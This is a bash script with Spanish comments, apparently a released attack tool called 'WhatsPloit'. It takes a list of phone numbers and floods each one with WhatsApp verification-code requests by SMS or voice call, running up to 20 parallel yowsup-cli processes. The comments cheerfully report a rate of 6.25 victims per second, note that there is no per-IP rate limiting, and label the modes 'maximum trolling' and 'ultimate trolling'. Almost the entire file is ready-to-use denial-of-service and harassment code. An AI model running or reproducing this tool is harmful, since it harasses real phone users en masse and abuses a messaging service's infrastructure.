#!/bin/bash
## WhatsPloit by alist3r
## Prueba de concepto que demuestra como es posible realizar un DoS masivo en whatsapp
## a una lista de numeros de telefono de usuarios del servicio, sin necesitar mas datos
## que el numero de telefono, mediante el sistema de solicitud de codigo de validacion
## que se realiza la primera vez que se ejecuta whatsapp en un telefono.
## Tambien se incluye yowsup, la api de python para whatsapp necesaria para el funcionamiento
## de wapwn, asi como toda su documentación original.

## USO:
## ./whatsploit.sh listadevictimas.list
## cat listadevictimas.list | ./wapwn.sh
## donde listadevictimas.list es un archivo de texto con un numero de telefono por linea
## no requiere prefijo de pais ya que va preconfigurado en este script
## para probar con numeros fuera de españa, modificar la variable countryprefix 
## con el codigo de pais correspondiente en cada caso

## USO 2:
## ./whatsploit.sh
## wapwn entra en modo interactivo, esperando a que tecleemos un numero de telefono en la consola
## al pulsar enter, se realizara el ataque contra dicho numero.
## la consola volvera a estar lista para introducir otro numero

## en el benchmarking se ha alcanzado una velocidad de denegacion de 6,25 victimas por segundo
## y no parece que los servidores de whatsapp controlen el numero de peticiones por IP

## puedes realizar tu propio benchmarking ejecutando el script ./benchmark.sh, tambien incluido.
## el benchmark realizara 1000 ataques a un numero no existente para no hacer daño a nadie (benchmark.list), 
## y posteriormente te dira el tiempo en segundos que tardo en realizarse el proceso.
## tiempo / 1000 = velocidad en ataques por segundo

## ========================================================
## CONFIG
## requestcodemethod: mecanismo de solicitud de la clave de validacion
## descomentad una de las dos siguientes versiones

## version sms (maximum trolling)
requestcodemethod=sms

## version voz (ultimate trolling)
#requestcodemethod=voice

## countryprefix: prefijo del pais de los numeros de telefono que vamos a atacar
## si la lista de numeros ya contiene el prefijo, se puede dejar esta variable en blanco
countryprefix=
#countryprefix=34

## max_parallel: cantidad maxima de ataques simultaneos (procesos hijos)
export max_parallel=20

## === FUNCTIONS ===
children_throttle() {
# gestionamos los procesos hijos en rafagas
# primero entramos en un bucle de espera infinita
# luego contamos los procesos, descontando uno a la cantidad, ya que ps tambien es un proceso
# pero no cuenta como numero de telefono al que estamos atacando simultaneamente
# salimos del bucle cuando el numero de procesos paralelos hijos (num_parallel) es menor que max_parallel
# de modo que queda espacio para crear otro proceso hijo
let num_parallel=`ps --no-headers -o pid --ppid=$$ | wc -w`-1
until [ $num_parallel -lt $max_parallel ]; do
  let num_parallel=`ps --no-headers -o pid --ppid=$$ | wc -w`-1
done
## DEBUG: controlando el numero de procesos hijos. debe ser siempre menos de max_parallel
# echo DEBUG: num_parallel=${num_parallel} - max_parallel=${max_parallel}
}


## === START ===
# primero, creamos un directorio temporal para alojar los ficheros de config que iran creandose para cada victima
# ejecutad el script desde dentro de un tmpfs para incrementar un poco su velocidad (aunque no gran cosa)
mkdir -p tmpconfigs
# en el bucle a continacion leeremos del fichero indicado en el primer parametro al script,
# si no hay parametros, leeremos de la entrada estandar

num_parallel=0
set -bm
# entramos en el main loop
while read line; do 

# ver la funcion children_throttle arriba para mas info
children_throttle

# tomamos el countryprefix, que es una constante configurable del script,
# la sumamos a la linea que estamos leyendo de la lista de numeros a atacar,
# y con eso obtenemos un target valido, con el formato de usuario de whatsapp.
# si el target es 600123456 y el countryprefix es el de españa (34), entonces
# el usuario de whatsapp sera 34600123456
target=${countryprefix}${line}

# generamos el config con el numero de la victima en formato de usuario de whatsapp
echo "phone=${target}
id=
password=" > tmpconfigs/${target}
#            ^^^^^^^^^^^^^^^^^^ si atacamos al numero 600123456 y tenemos configurado
# el countryprefix para españa (34), entonces el fichero se guardara en tmpconfigs/34600123456 

# y ahora solicitamos el confirmation code, llamando a yowsup-cli con el parametro r
# e indicando el fichero de config recien generado con los datos de la victima...
echo [Attacking] ${target}
(
result="$(python yowsup-cli -r ${requestcodemethod} -c tmpconfigs/${target})"
status=$(echo "$result" | grep --max-count=1 "status" | cut -d":" -f2)
reason=$(echo "$result" | grep --max-count=1 "reason" | cut -d":" -f2)
echo [Results][${target}] ${status} ${reason}
# debug block start
#echo DEBUG: "$result"
#read foo
# debug block end
) &
## DEBUG - salida estandar visible
# python yowsup-cli -r ${requestcodemethod} -c tmpconfigs/${target} &

done  < "${1:-/proc/${$}/fd/0}" 
# esperamos a que finalicen todos los procesos hijos
echo Lista procesada. Esperando procesos hijos...
wait 
echo Todos los procesos hijos finalizados. Limpiando...
# limpiamos todos los confis
rm -rf tmpconfigs
